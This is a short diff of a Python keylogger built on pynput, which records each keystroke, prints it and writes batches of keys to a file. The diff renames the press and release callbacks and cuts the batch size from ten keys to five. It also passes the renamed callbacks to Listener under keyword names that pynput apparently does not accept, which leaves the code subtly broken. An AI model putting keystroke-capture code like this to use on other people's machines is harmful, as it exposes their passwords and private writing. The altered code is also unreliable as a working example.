@@ -4,14 +4,14 @@ keys = []
 
 from pynput.keyboard import Key, Listener
 
-def on_press(key):
+def key_press(key):
     global keys, count
 
     keys.append(key)
     count += 1
     print("{0} pressed".format(key))
 
-    if count >= 10:
+    if count >= 5:
         count = 0
         write_file(keys)
         keys = []
@@ -28,10 +28,10 @@ def write_file(keys):
                 f.write(k)
 
 
-def on_release(key):
+def key_release(key):
     if key == Key.esc:
         return False
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
+with Listener(key_press=key_press, key_release=key_release) as listener:
     listener.join()
     
